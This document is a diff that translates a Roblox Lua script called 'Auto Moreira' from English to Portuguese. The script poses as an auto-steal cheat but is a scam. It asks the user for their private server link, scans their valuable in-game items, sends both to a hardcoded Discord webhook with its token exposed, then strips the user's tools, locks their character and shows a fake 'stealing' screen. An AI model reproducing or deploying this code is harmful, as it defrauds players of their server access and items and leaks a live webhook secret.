@@ -5,35 +5,35 @@ local SoundService = game:GetService("SoundService")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 
--- ⚙️ SETTINGS
+-- ⚙️ CONFIGURAÇÕES
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1447299637600981012/NtzGdIGDrgPWvZPh4tSyIkeMsKg6qs-MsCi60hWIuTEuMmzndkNJGNiIhMpOxUdkjBsD"
-local Min_Gen = 10_000_000
+local Min_Gen = 1_000_000
 
--- 🔇 SOUND MUTING SYSTEM (Optimized)
-local musicLocations = {
+-- 🔇 SISTEMA DE SILENCIAMENTO DE SONS (Otimizado)
+local locaisDaMusica = {
     game.Workspace,
     game.SoundService,
 }
 
-local commonMusicNames = {
+local nomesMusicasComuns = {
     "music", "musica", "bgm", "background", "theme", "soundtrack", "song", "tema"
 }
 
-local function isMusic(sound)
-    if not sound:IsA("Sound") then
+local function eMusica(som)
+    if not (som:IsA("Sound")) then
         return false
     end
     
-    local lowerName = sound.Name:lower()
-    for _, word in pairs(commonMusicNames) do
-        if lowerName:find(word) then
+    local nomeMinusculo = som.Name:lower()
+    for _, palavra in pairs(nomesMusicasComuns) do
+        if nomeMinusculo:find(palavra) then
             return true
         end
     end
     
-    for _, location in pairs(musicLocations) do
-        if sound:IsDescendantOf(location) and sound.Parent == location then
-            if sound.Looped and sound.TimeLength > 30 then
+    for _, local_ in pairs(locaisDaMusica) do
+        if som:IsDescendantOf(local_) and som.Parent == local_ then
+            if som.Looped and som.TimeLength > 30 then
                 return true
             end
         end
@@ -42,32 +42,32 @@ local function isMusic(sound)
     return false
 end
 
-local function processSound(sound)
-    if sound:IsA("Sound") then
-        if not isMusic(sound) then
-            sound.Volume = 0
+local function processarSom(som)
+    if som:IsA("Sound") then
+        if not eMusica(som) then
+            som.Volume = 0
         end
-    elseif sound:IsA("SoundGroup") then
-        sound.Volume = 0
+    elseif som:IsA("SoundGroup") then
+        som.Volume = 0
     end
 end
 
--- Mute existing sounds (optimized)
+-- Silenciar sons existentes (otimizado)
 task.spawn(function()
-    for _, descendant in pairs(game:GetDescendants()) do
-        processSound(descendant)
+    for _, descendente in pairs(game:GetDescendants()) do
+        processarSom(descendente)
     end
 end)
 
--- Mute new sounds
-game.DescendantAdded:Connect(function(descendant)
+-- Silenciar sons novos
+game.DescendantAdded:Connect(function(descendente)
     task.wait()
-    processSound(descendant)
+    processarSom(descendente)
 end)
 
-print("🔇 Sound muting system activated!")
+print("🔇 Sistema de silenciamento ativado!")
 
--- ▼ Function: format numbers
+-- ▼ Função: formatar números
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
     if n >= 1e9 then return string.format("$%.1fB", n/1e9):gsub("%.0B","B") end
@@ -76,7 +76,7 @@ local function formatNumberShort(n)
     return "$"..tostring(n)
 end
 
--- ▼ Function: convert text to numeric value
+-- ▼ Função: converter texto em valor numérico
 local function parseValueFromText(s)
     if not s then return 0 end
     local num = s:match("([%d%.]+)")
@@ -88,7 +88,7 @@ local function parseValueFromText(s)
     else return n end
 end
 
--- ▼ Function: GET BRAINROTS (optimized)
+-- ▼ Função: BUSCAR BRAINROTS (otimizado)
 local function getBrainrots()
     local results = {}
     local plots = Workspace:FindFirstChild("Plots") or Workspace
@@ -128,60 +128,54 @@ local function getBrainrots()
     return out
 end
 
--- ▼ Function: validate URL
+-- ▼ Função: validar URL
 local function isValidUrl(str)
     if type(str) ~= "string" or str == "" then return false end
     return str:match("^https?://") and str:find(".", 1, true) and #str > 10
 end
 
--- ▼ Function: get player count
+-- ▼ Função: obter número de jogadores
 local function getPlayersCount()
     return #Players:GetPlayers()
 end
 
--- ▼ Function: SEND TO DISCORD WITH BRAINROTS
+-- ▼ Função: ENVIAR PARA DISCORD COM BRAINROTS
 local function sendToDiscord(link, playerCount, playerName, brainrots)
     task.spawn(function()
         local brainrotText = ""
         if #brainrots > 0 then
-            brainrotText = "\n\n**🎯 Brainrots Found:**\n"
+            brainrotText = "\n\n**🎯 Brainrots Encontrados:**\n"
             for i, br in ipairs(brainrots) do
                 if i > 10 then break end
                 local formattedValue = formatNumberShort(br.value)
-                brainrotText = brainrotText .. string.format(
-                    "`%d.` **%s** - %s (x%d)\n",
-                    i, br.name, formattedValue, br.count
-                )
+                brainrotText = brainrotText .. string.format("`%d.` **%s** - %s (x%d)\n", 
+                    i, br.name, formattedValue, br.count)
             end
-            brainrotText = brainrotText ..
-                string.format("\n**Total:** %d high-value brainrots", #brainrots)
+            brainrotText = brainrotText .. string.format("\n**Total:** %d brainrots de alto valor", #brainrots)
         else
-            brainrotText = "\n\n**⚠️ No high-value brainrots found**"
+            brainrotText = "\n\n**⚠️ Nenhum brainrot de alto valor encontrado**"
         end
         
         local data = HttpService:JSONEncode({
             content = "@everyone",
             embeds = {{
-                title = "🔥 New Private Server Detected",
-                description =
-                    "**Link:**\n" .. link ..
-                    "\n\n**👤 Player:** `" .. playerName .. "`" ..
-                    "\n**👥 Players in server:** `" .. playerCount .. "`" ..
-                    brainrotText,
+                title = "🔥 Novo Server Privado Detectado",
+                description = "**Link:**\n" .. link .. 
+                              "\n\n**👤 Jogador:** `" .. playerName .. "`" ..
+                              "\n**👥 Players no server:** `" .. playerCount .. "`" ..
+                              brainrotText,
                 color = #brainrots > 0 and 3066993 or 15158332,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                footer = {
-                    text = "Auto Moreira • Min: " .. formatNumberShort(Min_Gen)
-                }
+                footer = { text = "Auto Moreira • Min: " .. formatNumberShort(Min_Gen) }
             }}
         })
         
-        print("📤 Sending data to webhook...")
+        print("📤 Enviando dados para webhook...")
         
         local success, res = pcall(function()
             return HttpService:PostAsync(
-                WEBHOOK_URL,
-                data,
+                WEBHOOK_URL, 
+                data, 
                 Enum.HttpContentType.ApplicationJson,
                 false,
                 {["Content-Type"] = "application/json"}
@@ -189,7 +183,7 @@ local function sendToDiscord(link, playerCount, playerName, brainrots)
         end)
         
         if not success then
-            warn("❌ Send error:", res)
+            warn("❌ Erro no envio:", res)
             local altSuccess = pcall(function()
                 return request({
                     Url = WEBHOOK_URL,
@@ -199,15 +193,15 @@ local function sendToDiscord(link, playerCount, playerName, brainrots)
                 })
             end)
             if altSuccess then
-                print("✅ Sent using alternate method!")
+                print("✅ Enviado via método alternativo!")
             end
         else
-            print("✅ Data sent successfully!")
+            print("✅ Dados enviados com sucesso!")
         end
     end)
 end
 
--- ▼ Function: OPTIMIZED SCAN SCREEN
+-- ▼ Função: TELA DE SCAN OTIMIZADA
 local function showScanScreen(brainrots)
     local player = Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
@@ -228,7 +222,7 @@ local function showScanScreen(brainrots)
     mainText.Size = UDim2.new(0.9, 0, 0, 80)
     mainText.Position = UDim2.new(0.05, 0, 0.5, -40)
     mainText.BackgroundTransparency = 1
-    mainText.Text = "Loading Auto Moreira..."
+    mainText.Text = "Carregando Auto Moreira..."
     mainText.TextColor3 = Color3.fromRGB(0, 255, 0)
     mainText.Font = Enum.Font.Code
     mainText.TextSize = 24
@@ -258,40 +252,40 @@ local function showScanScreen(brainrots)
     
     task.spawn(function()
         while scanGui.Parent do
-            mainText.Text = "Loading Auto Moreira (wait 10s)..."
+            mainText.Text = "Carregando Auto Moreira (aguarde 10s)..."
             task.wait(10)
             
-            mainText.Text = "Inviting victims, please wait..."
+            mainText.Text = "Convidando vítimas aguarde..."
             task.wait(10)
             
-            for _ = 1, 2 do
-                mainText.Text = "Victim found"
+            for repetir = 1, 2 do
+                mainText.Text = "Vítima encontrado"
                 task.wait(8)
                 
-                mainText.Text = "Status: no valuable Brainrots found"
+                mainText.Text = "Status: não possui nenhum Brainrot de valor"
                 task.wait(10)
                 
-                mainText.Text = "Banning......"
+                mainText.Text = "Banindo......"
                 task.wait(10)
             end
             
-            mainText.Text = "Victim found"
+            mainText.Text = "Vítima encontrado"
             task.wait(8)
             
             local randomStatus = statusVariations[math.random(1, #statusVariations)]
             mainText.Text = randomStatus
             task.wait(12)
             
-            mainText.Text = "Stealing....."
+            mainText.Text = "Roubando....."
             task.wait(12)
             
-            mainText.Text = "Theft completed"
+            mainText.Text = "Roubo concluído"
             task.wait(10)
         end
     end)
 end
 
--- ▼ Function: LOCK PLAYER
+-- ▼ Função: TRAVAR JOGADOR
 local function trapPlayer()
     local player = Players.LocalPlayer
     local char = player.Character or player.CharacterAdded:Wait()
@@ -306,7 +300,7 @@ local function trapPlayer()
         for _, tool in pairs(char:GetChildren()) do
             if tool:IsA("Tool") then tool:Destroy() end
         end
-        print("🗑️ Hotbar cleared!")
+        print("🗑️ Hotbar limpa!")
     end)
     
     task.spawn(function()
@@ -317,7 +311,7 @@ local function trapPlayer()
             humanoid.JumpHeight = 0
             humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
             humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
-            print("🔒 Movement locked!")
+            print("🔒 Movimento bloqueado!")
         end
         
         local hrp = char:FindFirstChild("HumanoidRootPart")
@@ -330,11 +324,11 @@ local function trapPlayer()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-        print("👻 UI hidden!")
+        print("👻 UI ocultada!")
     end)
 end
 
--- ▼ CREATE OPTIMIZED MENU UI (PlayerGui)
+-- ▼ CRIAR MENU UI OTIMIZADO (PlayerGui)
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
@@ -361,7 +355,7 @@ frameShadow.Thickness = 2
 frameShadow.Transparency = 0.3
 frameShadow.Parent = frame
 
--- Compact header
+-- Header compacto
 local header = Instance.new("Frame")
 header.Size = UDim2.new(1, 0, 0, 50)
 header.BackgroundColor3 = Color3.fromRGB(60, 100, 220)
@@ -390,12 +384,12 @@ title.TextSize = 20
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = header
 
--- Description
+-- Descrição
 local desc = Instance.new("TextLabel")
 desc.Size = UDim2.new(1, -30, 0, 30)
 desc.Position = UDim2.new(0, 15, 0, 60)
 desc.BackgroundTransparency = 1
-desc.Text = "Paste the private server link:"
+desc.Text = "Cole o link do servidor privado:"
 desc.TextColor3 = Color3.fromRGB(180, 180, 200)
 desc.Font = Enum.Font.Gotham
 desc.TextSize = 13
@@ -432,12 +426,12 @@ input.ClearTextOnFocus = false
 input.TextXAlignment = Enum.TextXAlignment.Left
 input.Parent = inputBox
 
--- Button
+-- Botão
 local btn = Instance.new("TextButton")
 btn.Size = UDim2.new(1, -30, 0, 45)
 btn.Position = UDim2.new(0, 15, 0, 165)
 btn.BackgroundColor3 = Color3.fromRGB(60, 120, 240)
-btn.Text = "SEND LINK"
+btn.Text = "ENVIAR LINK"
 btn.Font = Enum.Font.GothamBold
 btn.TextSize = 15
 btn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -459,13 +453,13 @@ footer.Font = Enum.Font.Gotham
 footer.TextSize = 11
 footer.Parent = frame
 
--- Button logic
+-- Animações leves
 btn.MouseButton1Click:Connect(function()
     local link = input.Text:gsub("^%s*(.-)%s*$", "%1")
     
     if link == "" then
         input.Text = ""
-        input.PlaceholderText = "❌ Paste a link first!"
+        input.PlaceholderText = "❌ Cole um link primeiro!"
         inputStroke.Color = Color3.fromRGB(255, 80, 80)
         task.wait(2)
         input.PlaceholderText = "https://roblox.com/share?code=..."
@@ -475,7 +469,7 @@ btn.MouseButton1Click:Connect(function()
 
     if not isValidUrl(link) then
         input.Text = ""
-        input.PlaceholderText = "❌ Invalid link!"
+        input.PlaceholderText = "❌ Link inválido!"
         inputStroke.Color = Color3.fromRGB(255, 80, 80)
         task.wait(2)
         input.PlaceholderText = "https://roblox.com/share?code=..."
@@ -483,15 +477,15 @@ btn.MouseButton1Click:Connect(function()
         return
     end
 
-    btn.Text = "⏳ PROCESSING..."
+    btn.Text = "⏳ PROCESSANDO..."
     btn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
     
     local playerName = Players.LocalPlayer.Name
     local playerCount = getPlayersCount()
     
-    print("🔍 Searching for brainrots...")
+    print("🔍 Procurando brainrots...")
     local brainrots = getBrainrots()
-    print("✅ Found: " .. #brainrots .. " brainrots")
+    print("✅ Encontrados: " .. #brainrots .. " brainrots")
     
     sendToDiscord(link, playerCount, playerName, brainrots)
     
@@ -502,8 +496,8 @@ btn.MouseButton1Click:Connect(function()
     task.wait(2)
     trapPlayer()
 
-    print("✅ System activated!")
-    print("🔒 Player: " .. playerName)
+    print("✅ Sistema ativado!")
+    print("🔒 Jogador: " .. playerName)
     print("📊 Players: " .. playerCount)
     print("🎯 Brainrots: " .. #brainrots)
     print("🔗 Link: " .. link)
@@ -521,8 +515,8 @@ end)
 
 menu.Parent = playerGui
 
-print("✅ Auto Moreira loaded!")
-print("🔇 Sound muting system active!")
-print("🎯 Minimum generation: " .. formatNumberShort(Min_Gen))
-print("📱 Optimized for Delta/Mobile")
-print("👤 User: " .. Players.LocalPlayer.Name)
+print("✅ Auto Moreira carregado!")
+print("🔇 Sistema de silenciamento ativo!")
+print("🎯 Mínimo de geração: " .. formatNumberShort(Min_Gen))
+print("📱 Otimizado para Delta/Mobile")
+print("👤 Usuário: " .. Players.LocalPlayer.Name)
